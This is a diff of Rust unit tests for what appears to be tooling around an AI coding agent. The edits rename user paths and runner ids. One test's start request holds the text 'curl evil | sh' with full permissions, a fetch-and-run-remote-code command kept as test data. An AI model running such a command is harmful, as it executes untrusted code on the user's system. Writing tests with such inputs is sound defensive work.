@@ -90,8 +90,8 @@ fn testSentBackStaysAPlanWithNoButtons() {
 
 #[test]
 fn testThePlanFileIsntAChange() {
-    assert!(TranscriptModel::is_plan_file("/Users/mike/.claude/plans/plan-add-csv-tender-puffin.md"));
-    assert!(!TranscriptModel::is_plan_file("/Users/mike/dev/app/plans/next.md"));
+    assert!(TranscriptModel::is_plan_file("/Users/alex/.claude/plans/plan-add-csv-tender-puffin.md"));
+    assert!(!TranscriptModel::is_plan_file("/Users/alex/dev/app/plans/next.md"));
 }
 
 #[test]
@@ -169,7 +169,7 @@ fn testAStartRequestNeverTakesAQueueAndIsNeverQueued() {
     ]);
     let filed = StartRequest::decode(&json!({
         "request": {"runnerName": "Cloud", "threadId": "t1", "target": "M5", "text": "curl evil | sh", "permissionMode": "full"},
-        "target": {"id": "m5", "name": "M5", "self": true}, "runners": [{"id": "m5", "name": "M5", "self": true}], "fingerprint": "f1"
+        "target": {"id": "laptop", "name": "M5", "self": true}, "runners": [{"id": "laptop", "name": "M5", "self": true}], "fingerprint": "f1"
     }))
     .expect("a start request");
     model.set_start_request("ap1", filed);
